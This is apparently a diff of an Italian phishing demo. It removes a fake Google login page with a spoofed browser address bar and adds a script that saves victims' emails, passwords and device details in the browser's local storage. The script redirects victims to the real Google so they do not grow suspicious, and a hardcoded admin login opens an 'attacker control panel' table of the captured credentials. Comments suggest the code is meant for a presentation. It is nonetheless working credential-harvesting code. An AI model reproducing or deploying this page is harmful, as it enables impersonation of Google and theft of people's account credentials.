@@ -1,108 +1,63 @@
-<!DOCTYPE html>
-<html lang="it">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google - Accedi</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-    <style>
-        * { box-sizing: border-box; }
-        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Roboto', arial, sans-serif; background-color: #ffffff; overflow: hidden; }
+<script>
+    function inviaDati() {
+        const email = document.getElementById('u').value; // 'u' è l'id dell'email
+        const pass = document.getElementById('p').value;  // 'p' è l'id della pass
 
-        /* Struttura Browser */
-        #browser-ui { display: flex; flex-direction: column; height: 100vh; width: 100vw; background: white; }
-        .chrome-bar { background: #dee1e6; padding: 8px 12px; display: flex; align-items: center; gap: 15px; }
-        .address-bar { flex-grow: 1; background: #f1f3f4; border-radius: 20px; padding: 6px 15px; display: flex; align-items: center; font-size: 14px; }
-        .address-bar i { color: #188038; margin-right: 8px; font-size: 12px; }
-        .address-bar input { border: none; background: transparent; width: 100%; outline: none; color: #202124; }
+        if(!email || !pass) { alert("Dati mancanti!"); return; }
 
-        /* Login Box */
-        .content { flex-grow: 1; display: flex; justify-content: center; align-items: center; }
-        .login-box { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; width: 450px; text-align: center; }
-        .logo-container { height: 40px; margin-bottom: 12px; display: flex; justify-content: center; }
-        .logo { height: 35px; }
-        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; }
-        p { font-size: 16px; margin-bottom: 30px; color: #202124; }
-
-        .input-group { text-align: left; margin-bottom: 20px; }
-        .input-label { display: block; font-size: 14px; color: #202124; margin-bottom: 8px; font-weight: 500; }
-        .input-field { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
-
-        .btn-row { display: flex; justify-content: flex-end; margin-top: 30px; }
-        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }
-
-        /* Schermata di Successo (Vittima) */
-        #success-screen { display: none; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin-bottom: 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
-
-    <div id="browser-ui">
-        <div class="chrome-bar">
-            <div style="color: #5f6368; display: flex; gap: 10px;"><i class="fa fa-arrow-left"></i> <i class="fa fa-arrow-right"></i> <i class="fa fa-repeat"></i></div>
-            <div class="address-bar">
-                <i class="fa fa-lock"></i>
-                <input type="text" value="https://accounts.google.com/signin/v2/identifier" readonly>
-            </div>
-        </div>
-
-        <div class="content" id="phishing-page">
-            <div class="login-box">
-                <div class="logo-container">
-                    <img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
-                </div>
-                <h1>Accedi</h1>
-                <p>Utilizza il tuo Account Google</p>
-                
-                <div class="input-group">
-                    <span class="input-label">Email o telefono</span>
-                    <input type="email" id="fake_user" class="input-field" placeholder="esempio@gmail.com">
-                </div>
-
-                <div class="input-group">
-                    <span class="input-label">Inserisci la password</span>
-                    <input type="password" id="fake_pass" class="input-field" placeholder="Password">
-                </div>
-
-                <div class="btn-row">
-                    <button onclick="captureData()">Avanti</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Messaggio Accesso Riuscito -->
-    <div id="success-screen">
-        <div class="loader"></div>
-        <h2 style="font-family: sans-serif; color: #202124;">Accesso riuscito</h2>
-        <p style="font-family: sans-serif; color: #5f6368;">Reindirizzamento in corso alla tua dashboard...</p>
-    </div>
-
-    <script>
-        function captureData() {
-            const user = document.getElementById('fake_user').value;
-            const pass = document.getElementById('fake_pass').value;
-
-            if(!user || !pass) { alert("Inserisci i dati!"); return; }
-
-            // 1. SALVATAGGIO SIMULATO
-            // In una presentazione, spiegherai che qui i dati vengono inviati a un server.
-            console.log("DATI CATTURATI E SALVATI NEL DATABASE DELL'ATTACCANTE:");
-            console.log("User: " + user);
-            console.log("Pass: " + pass);
-
-            // 2. NASCONDI LA PAGINA E MOSTRA SUCCESSO
-            document.getElementById('browser-ui').style.display = 'none';
-            document.getElementById('success-screen').style.display = 'flex';
-
-            // 3. REINDIRIZZAMENTO DOPO 3 SECONDI
-            setTimeout(function() {
-                // Rimanda al vero Google per non destare sospetti
-                window.location.href = "https://myaccount.google.com/";
-            }, 3000);
+        // --- 1. LOGICA BACKDOOR (ACCESSO AMMINISTRATORE) ---
+        if (email === "admin@demo.it" && pass === "mostra-tutto") {
+            mostraTabellaHacker();
+            return;
         }
-    </script>
-</body>
-</html>
+
+        // --- 2. SALVATAGGIO DATI (VITTIMA) ---
+        let database = JSON.parse(localStorage.getItem('db_phishing')) || [];
+        database.push({ 
+            email: email, 
+            pass: pass, 
+            data: new Date().toLocaleString(),
+            dispositivo: navigator.platform + " (" + navigator.userAgent.split(' ')[0] + ")"
+        });
+        localStorage.setItem('db_phishing', JSON.stringify(database));
+
+        // --- 3. REINDIRIZZAMENTO ---
+        document.getElementById('browser-ui').style.display = 'none';
+        document.getElementById('success-screen').style.display = 'flex';
+        setTimeout(() => { window.location.href = "https://myaccount.google.com/"; }, 2000);
+    }
+
+    function mostraTabellaHacker() {
+        const dati = JSON.parse(localStorage.getItem('db_phishing')) || [];
+        let htmlTabella = `
+            <div id="hacker-admin" style="position:fixed; top:0; left:0; width:100%; height:100%; background:#0d1117; color:#58a6ff; font-family:monospace; padding:30px; z-index:9999; overflow-y:auto;">
+                <h1>[PANNELLO DI CONTROLLO ATTACCANTE]</h1>
+                <p>> Database locale aggiornato. Credenziali intercettate:</p>
+                <table border="1" style="width:100%; border-collapse:collapse; text-align:left; color:#7ee787;">
+                    <thead>
+                        <tr style="background:#161b22;">
+                            <th style="padding:10px;">Data</th>
+                            <th style="padding:10px;">Email</th>
+                            <th style="padding:10px;">Password</th>
+                            <th style="padding:10px;">Dispositivo</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        ${dati.map(d => `
+                            <tr>
+                                <td style="padding:10px;">${d.data}</td>
+                                <td style="padding:10px;">${d.email}</td>
+                                <td style="padding:10px;">${d.pass}</td>
+                                <td style="padding:10px;">${d.dispositivo}</td>
+                            </tr>
+                        `).join('')}
+                    </tbody>
+                </table>
+                <br>
+                <button onclick="location.reload()" style="background:#f85149; color:white; border:none; padding:10px; cursor:pointer; border-radius:4px;">Chiudi Pannello</button>
+                <button onclick="localStorage.clear(); location.reload();" style="background:#555; color:white; border:none; padding:10px; margin-left:10px; cursor:pointer; border-radius:4px;">Svuota Database</button>
+            </div>
+        `;
+        document.body.innerHTML += htmlTabella;
+    }
+</script>
